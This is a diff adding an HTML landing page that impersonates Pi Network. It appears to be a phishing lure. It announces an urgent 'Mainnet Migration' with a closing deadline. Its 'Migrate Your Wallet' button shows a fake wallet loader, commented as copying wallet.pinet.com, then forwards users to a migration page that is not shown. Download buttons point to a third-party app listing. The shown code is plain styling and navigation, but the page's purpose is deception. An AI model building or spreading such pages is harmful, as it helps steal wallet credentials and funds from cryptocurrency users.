@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pi Network</title>
+  <link rel="icon" href="pilogo.jpg" type="image/jpg">
+  <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600&display=swap" rel="stylesheet">
+  <meta name="description" content="Pi Network: Mine cryptocurrency easily on your phone. Learn about the Mainnet migration and the future of decentralized mining.">
+  <meta name="theme-color" content="#251339">
+  <style>
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Raleway', sans-serif;
+      background-color: #1c0e35;
+      color: white;
+      padding-bottom: 140px;
+    }
+
+    header {
+      background-color: #251339;
+      padding: 0.6rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      transition: background-color 0.3s ease, padding 0.3s ease;
+    }
+
+    header img {
+      height: 36px;
+      transition: height 0.3s ease;
+    }
+
+    header.shrink {
+      background-color: #583B8B !important;
+      padding: 0.3rem 1rem !important;
+    }
+
+    header.shrink img {
+      height: 28px !important;
+    }
+
+    .top-icons {
+      display: flex;
+      gap: 1.2rem;
+      align-items: center;
+    }
+
+    .search-icon {
+      width: 11.8px;
+      height: 11.8px;
+      border: 1.8px solid white;
+      border-radius: 50%;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .search-icon::after {
+      content: "";
+      position: absolute;
+      right: -3.8px;
+      bottom: -3.8px;
+      width: 4.8px;
+      height: 1.8px;
+      background: white;
+      transform: rotate(45deg);
+    }
+
+    .menu-icon {
+      font-size: 22px;
+      color: white;
+      cursor: pointer;
+    }
+
+    .hero {
+      background: url('bg.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding-top: 4rem;
+    }
+
+    .hero::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-color: rgba(37, 19, 57, 0.93);
+      backdrop-filter: blur(6px);
+      z-index: 1;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 3rem 1rem;
+      width: 100%;
+      position: relative;
+      z-index: 2;
+      text-align: left;
+      opacity: 0;
+      transform: translateY(40px);
+      animation: fadeInUp 1.2s ease-out forwards;
+      animation-delay: 0.4s;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .hero h1 {
+      font-size: 2.1rem;
+      margin-bottom: 1rem;
+      font-weight: 600;
+    }
+
+    .hero p {
+      color: #ccc;
+      margin-bottom: 1.5rem;
+      font-size: 1.2rem;
+    }
+
+    .download-btn {
+      display: inline-block;
+      padding: 0.75rem 1.5rem;
+      border: 2px solid #f7b400;
+      color: #f7b400;
+      font-weight: bold;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+      transition: all 0.3s ease;
+    }
+
+    .download-btn:hover {
+      background-color: #f7b400;
+      color: #1c0e35;
+    }
+
+    .hero video {
+      width: 100%;
+      max-width: 500px;
+      border-radius: 12px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .post-video-box {
+      margin-top: 2.2rem;
+      padding: 2rem;
+      border-radius: 16px;
+      background: linear-gradient(145deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+      border: 1px solid rgba(255,255,255,0.12);
+      box-shadow: 0 0 30px rgba(247,180,0,0.07);
+      text-align: center;
+      backdrop-filter: blur(4px);
+    }
+
+    .post-video-box h2 {
+      font-size: 1.6rem;
+      font-weight: 600;
+      color: #f7b400;
+      margin-bottom: 0.6rem;
+    }
+
+    .post-video-box p {
+      color: #ccc;
+      font-size: 1.05rem;
+      line-height: 1.6;
+      max-width: 500px;
+      margin: 0 auto 1rem;
+    }
+
+    .section-purple {
+      background: linear-gradient(135deg, #6f2bc0, #251339);
+      padding: 3rem 1rem;
+      text-align: center;
+    }
+
+    .section-purple h2 {
+      font-size: 1.2rem;
+      line-height: 1.5;
+      color: white;
+      font-weight: 600;
+    }
+
+    .white-section {
+      background-color: #fff;
+      color: #333;
+      padding: 3rem 1rem;
+      text-align: center;
+      border-radius: 28px 28px 0 0;
+      margin-top: -60px;
+      z-index: 10;
+      position: relative;
+      box-shadow: 0 -12px 20px rgba(0, 0, 0, 0.08);
+    }
+
+    .white-section h2 {
+      color: #8234c6;
+      font-size: 1.6rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .white-section p {
+      color: #666;
+      margin-bottom: 1.5rem;
+    }
+
+    .feature-card {
+      background: #fff;
+      margin: 1rem auto;
+      max-width: 90%;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 1.5rem;
+    }
+
+    .feature-card img {
+      height: 50px;
+      margin-bottom: 1rem;
+    }
+
+    .feature-card h3 {
+      color: #333;
+      margin-bottom: 0.5rem;
+    }
+
+    .feature-card p {
+      color: #555;
+    }
+
+    .bottom-download-banner {
+      position: fixed;
+      bottom: 13px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 40px;
+      padding: 0.6rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      width: 380px;
+      backdrop-filter: blur(6px);
+      z-index: 10000;
+    }
+
+    .banner-content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+    }
+
+    .banner-content span {
+      font-family: 'Raleway', sans-serif;
+      font-size: 0.9rem;
+      color: #333;
+      line-height: 1.2;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      padding-left: 5%;
+    }
+
+    .banner-content span strong {
+      font-size: 0.7rem;
+      font-weight: 600;
+      margin-bottom: 2px;
+    }
+
+    .banner-download-btn {
+      background-color: #f7b400;
+      color: white;
+      font-weight: bold;
+      padding: 0.5rem 0.9rem;
+      border-radius: 999px;
+      text-decoration: none;
+      font-size: 0.78rem;
+      margin-left: 10px;
+      white-space: nowrap;
+      transition: background 0.3s ease, transform 0.2s ease;
+    }
+
+    .banner-download-btn:hover {
+      background-color: #d89d00;
+      transform: translateY(-2px);
+    }
+
+    footer {
+      background-color: #1a0c2f;
+      padding: 2rem 1rem;
+      text-align: center;
+      color: #aaa;
+      font-size: 0.9rem;
+    }
+
+    footer a {
+      color: #ccc;
+      text-decoration: none;
+      margin: 0 0.5rem;
+      font-weight: 600;
+    }
+
+    footer a:hover {
+      color: #f7b400;
+    }
+
+    /* Loader style like wallet.pinet.com */
+    #loader-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: white;
+      z-index: 99999;
+      opacity: 0;
+      pointer-events: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.4s ease;
+      font-family: 'Raleway', sans-serif;
+    }
+
+    #loader-screen .circle {
+      width: 38px;
+      height: 38px;
+      border: 4px solid #713D92;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 12px;
+    }
+
+    #loader-screen p {
+      color:#713D92;
+      font-weight: 500;
+      font-size: 1rem;
+      margin: 0;
+    }
+
+    @media (max-width: 480px) {
+      .bottom-download-banner {
+        width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="pilogo.jpg" alt="Pi Logo" />
+    <div class="top-icons">
+      <div class="search-icon"></div>
+      <div class="menu-icon">&#9776;</div>
+    </div>
+  </header>
+
+  <section class="hero">
+    <div class="container">
+      <h1>Mainnet Migration is Underway.</h1>
+      <p>Pi Network’s Second Migration Phase has begun.<br />Complete your migration now to unlock your Pi.</p>
+      <a href="migration.html" class="download-btn" id="migrateBtn">Migrate Your Wallet →</a>
+
+      <video autoplay muted loop playsinline>
+        <source src="pi.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
+
+      <div class="post-video-box">
+        <h2>Ready for Mainnet?</h2>
+        <p>You’re one step away from unlocking your Pi. Migrating now gives you access to real utilities, dApps, and a place in the decentralized future.</p>
+        <p>Migration window closes in <strong style="color: #f7b400;">14 days</strong> — don’t wait.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section-purple">
+    <h2>
+      Mining crypto is hard.<br/>
+      Investing in crypto is risky.<br/>
+      Too many of us are left out of the cryptocurrency revolution…
+    </h2>
+  </section>
+
+  <section class="white-section">
+    <img src="https://minepi.com/assets/pi-phone.6fbdd5ee.png" alt="Phone displaying Pi Network app" style="width: 80%; max-width: 300px;" loading="lazy"/>
+    <h2>Pi makes crypto mining easy.</h2>
+    <p>Breakthrough tech allows you to mine Pi on your phone without draining your battery.</p>
+    <a href="https://play.google.com/store/apps/details?id=com.blockchainvault" class="download-btn" style="background:#8234c6;color:#fff;border:none;">Learn The Tech Behind Pi →</a>
+  </section>
+
+  <section class="white-section" style="background:#f9f9f9;">
+    <div class="feature-card">
+      <img src="https://minepi.com/assets/decentralized.07c1d5dd.svg" alt="Decentralized" loading="lazy"/>
+      <h3>Decentralized</h3>
+      <p>Secure, Immutable, non-counterfeitable and interoperable digital money.</p>
+    </div>
+    <div class="feature-card">
+      <img src="https://minepi.com/assets/mobile.5b49b98f.svg" alt="Mobile First" loading="lazy"/>
+      <h3>Mobile First</h3>
+      <p>Works on your mobile phone and does not drain your battery.</p>
+    </div>
+    <div class="feature-card">
+      <img src="https://minepi.com/assets/user-friendly.142506b4.svg" alt="User Friendly" loading="lazy"/>
+      <h3>User & Planet-Friendly</h3>
+      <p>Easy to use, secure at scale, without the massive electrical waste.</p>
+    </div>
+  </section>
+
+  <div class="bottom-download-banner">
+    <div class="banner-content">
+      <span>
+        <strong>Pi Network</strong>
+        Start mining. Easy as Pi!
+      </span>
+      <a href="https://play.google.com/store/apps/details?id=com.blockchainvault" class="banner-download-btn">Download</a>
+    </div>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 Pi Network. All rights reserved.</p>
+    <p>
+      <a href="#">Privacy Policy</a> | 
+      <a href="#">Terms of Use</a> | 
+      <a href="#">Support</a>
+    </p>
+  </footer>
+
+  <!-- Pi-style Loader -->
+  <div id="loader-screen">
+    <div class="circle"></div>
+    <p>Loading wallet...</p>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    document.getElementById("migrateBtn").addEventListener("click", function (e) {
+      e.preventDefault();
+      const loader = document.getElementById("loader-screen");
+      loader.style.opacity = 1;
+      loader.style.pointerEvents = "auto";
+      setTimeout(() => {
+        window.location.href = this.href;
+      }, 800);
+    });
+
+    let ticking = false;
+    window.addEventListener('scroll', function () {
+      if (!ticking) {
+        window.requestAnimationFrame(function () {
+          document.querySelector('header').classList.toggle('shrink', window.scrollY > 40);
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  </script>
+</body>
+</html>
